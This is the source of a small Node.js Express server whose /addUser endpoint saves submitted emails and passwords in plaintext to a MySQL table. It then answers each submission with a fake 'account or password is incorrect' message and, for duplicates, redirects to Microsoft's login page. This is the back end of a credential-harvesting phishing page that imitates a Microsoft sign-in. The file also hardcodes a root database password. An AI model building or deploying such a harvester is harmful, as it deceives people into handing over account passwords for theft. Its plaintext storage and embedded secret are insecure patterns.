const express = require('express');
const mysql = require('mysql');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json()); // Required to parse JSON data in the request body

const db = mysql.createConnection({
    host: "localhost",
    user: 'root',
    password: 'chyketechayomide',
    database: 'login_db'
});

app.get('/', (req, res) => {
    return res.json("From backend side");
});



// Change the endpoint to handle POST requests for inserting data
app.post('/addUser', (req, res) => {
    // Assuming you have JSON data in the request body with fields like 'username', 'password', etc.
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: "Username and password are required." });
    }

    const checkDuplicateEmailSql = "SELECT COUNT(*) as count FROM login_tbl WHERE email = ?";
    
    // Check if there are multiple records with the same email
    db.query(checkDuplicateEmailSql, [username], (countErr, countResult) => {
        if (countErr) {
            console.error(countErr);
            return res.status(500).json({ message: "Internal server error" });
        }

        const duplicateCount = countResult[0].count;

        if (duplicateCount > 1) {
            // Redirect to another page since there are multiple records with the same email
            return res.status(409).json({ message: "Multiple accounts found with the same email.", redirect: 'https://login.live.com/' });
        }

        // If no duplicate, proceed with inserting the new user
        const insertUserSql = "INSERT INTO login_tbl (email, password) VALUES (?, ?)";
        db.query(insertUserSql, [username, password], (insertErr, result) => {
            if (insertErr) {
                // Check if the error is due to a duplicate entry (email already exists)
                if (insertErr.code === 'ER_DUP_ENTRY') {
                    // Redirect to 'https://login.live.com/' with the specified link
                    return res.status(409).json({ message: "Email already exists.", redirect: 'https://login.live.com/' });
                } else {
                    console.error(insertErr);
                    return res.status(500).json({ message: "Internal server error" });
                }
            }

            return res.status(201).json({ message: 'Your account or password is incorrect. If you dont remember your password, <a href="#">reset it now.</a>', userId: result.insertId });
        });
    });
});


app.listen(8081, () => {
    console.log("listening");
});